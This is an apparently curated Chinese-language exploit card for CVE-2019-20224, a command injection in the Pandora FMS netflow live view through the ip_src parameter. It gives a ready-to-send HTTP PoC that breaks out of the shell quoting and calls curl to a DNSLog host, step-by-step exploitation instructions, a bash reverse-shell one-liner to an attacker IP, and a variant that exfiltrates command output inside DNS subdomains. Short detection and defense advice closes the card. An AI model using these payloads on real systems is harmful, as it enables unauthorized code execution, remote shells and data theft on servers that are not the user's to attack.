---
id: web-php-rce-pandorafms-netflow-ip-src-command-injection
title: Pandora FMS netflow 视图 ip_src 命令注入：闭合引号后 curl 带外确认执行（CVE-2019-20224）
type: scenario
domain: web
path: web/php/rce
technique: pandorafms-netflow-ip-src-command-injection
aliases:
- CVE-2019-20224
- Pandora FMS 命令执行
- nf_live_view ip_src
- netflow 参数命令注入
- reverse.wait DNSLog 确认
tags:
- web
- php
- pandorafms
- cve
- command-injection
- rce
- dnslog
- oob
cve:
- CVE-2019-20224
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V284
  verified_at: '2026-11-08T05:29:40+08:00'
  notes: 已对照原文（fscan 源码分析中 set/newReverse 示例 POC YAML，第1650-1665行）与唯一图片 img/01（ICMP报文格式，与本卡无关）核对：poc-yaml-pandorafms-cve-2019-20224-rce 的 POST /pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0，body 含 ip_src=%22%3Bcurl+{{reverseURL}}+%23、draw_button=Draw，expression response.status==200 && reverse.wait(5)，与卡片完全一致；CVE-2019-20224、路径 web/php/rce（path-check exists）正确。注意：原文仅给 POC 模板，未展示服务端拼接代码与 DNSLog 实际回连；卡片已如实写明此点、confidence=medium、未设 affected_versions（原文无版本区间）正确。dedup 0 related（Strapi/React Native/Spring 等不同应用）；dup-scan 无涉及 pair。PoC 未复跑。
---

## 一句话结论

Pandora FMS 的 netflow live view 把 `ip_src` 等过滤字段拼进后端 shell 命令时未做引号/元字符转义：在 `ip_src` 中提交 `";curl <dnslog> #` 可闭合原命令并执行任意命令，再用 DNSLog 收到回连来确认无回显的命令执行（CVE-2019-20224）。

## 原理

- 请求 `index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0` 用于生成 netflow 图表，`ip_src`/`ip_dst` 等字段会被拼进调用 netflow 数据查询工具（如 nfdump 过滤器）的 shell 命令。
- POC 的 payload 为 `ip_src=";curl http://<sub>.ceye.io #`：开头的 `"` 闭合命令中原有的双引号包裹，`;` 开始一条新命令，末尾 `#` 注释掉拼接在后面的原始参数，于是 `curl` 被独立执行。
- 这条命令执行没有回显（查询结果不回传命令 stdout），因此 POC 用 `newReverse()` 生成随机子域，并在表达式中写 `reverse.wait(5)`：5 秒内 DNSLog 平台收到该子域的解析/HTTP 请求即证明命令被执行。
- 原文只给出 POC 请求与带外验证，未展示服务端拼接代码；闭合双引号 + 分号 + 注释的构造可直接推断 `ip_src` 被放进双引号包裹的 shell 命令串。

## 触发条件

- 目标为存在该 netflow 命令注入的 Pandora FMS 版本（POC 名标注 CVE-2019-20224；原文未给出具体版本区间）。
- 目标暴露 `pandora_console/index.php` 且 netflow live view 功能可用。
- 认证要求原文未说明：POC 请求未带认证头；实战中若返回登录页/302，需补充有效会话 Cookie 后再发。
- 服务器可出网（能解析/访问 DNSLog 或自建回连域名），否则改用可观测的带内副作用。

## 利用步骤

1. 准备 DNSLog/CEYE 子域（或在目标可达处自建 HTTP 监听），得到域名。
2. 向 netflow live view 发送 POST，把 payload 放进 `ip_src`：`";curl http://<sub>.ceye.io #`（URL 编码为 `%22%3Bcurl+http%3A%2F%2F<sub>.ceye.io+%23`），同时带上表单调所需的其它字段（`draw_button=Draw` 等）。
3. 观察 DNSLog 是否在数秒内出现该随机子域的请求；出现即命令执行成功。
4. 把 `curl <dnslog>` 换成反弹 shell/下载执行命令（如 `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'`），完成 RCE。
5. 若 `ip_src` 有过滤，尝试 `ip_dst`、其它 netflow 过滤字段或不同的引号闭合方式。

## PoC

```http
POST /pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0 HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

date=0&time=0&period=0&interval_length=0&chart_type=netflow_area&max_aggregates=1&address_resolution=0&name=0&assign_group=0&filter_type=0&filter_id=0&filter_selected=0&ip_dst=0&ip_src=%22%3Bcurl+http%3A%2F%2F<sub>.ceye.io+%23&draw_button=Draw
```

判定（POC 表达式）：`response.status == 200 && reverse.wait(5)`，即请求成功后 5 秒内 DNSLog 收到回连。

## 变体与关联

- 变体：用 `ping <sub>.ceye.io`、`nslookup`、`wget` 代替 `curl`，适配无 curl 的环境。
- 变体：把命令结果编码进域名（如 `curl http://$(id|base64|tr -d '\n').<sub>.ceye.io`）实现数据外带。
- 关联：同类「表单参数拼 shell」的 PHP 监控/OA 应用命令注入；带外验证思路与 DNSLog 盲注一致。

## 检测与防御

- 防御：`ip_src`/`ip_dst` 等字段严格按 IP/CIDR 白名单校验（`filter_var` + 网段校验），拒绝引号、分号、反引号、`$()` 等元字符。
- 防御：不要经 shell 调用 netflow 工具；使用参数数组直接 exec，或对每个参数用 `escapeshellarg()` 后再拼接；尽量以库方式调用而非命令行。
- 防御：不需要 netflow 模块时禁用/下线该功能；Web 进程降权并限制其出网（DNS/HTTP），降低带外确认与后续利用成功率。
- 检测：审计 `nf_live_view` 请求中 `ip_src`/`ip_dst` 含 `%22`、`%3B`、`%23`、`%60`、`$(` 等编码字符；监控 Web 服务器向外部 DNSLog 域名的异常解析与 HTTP 请求。
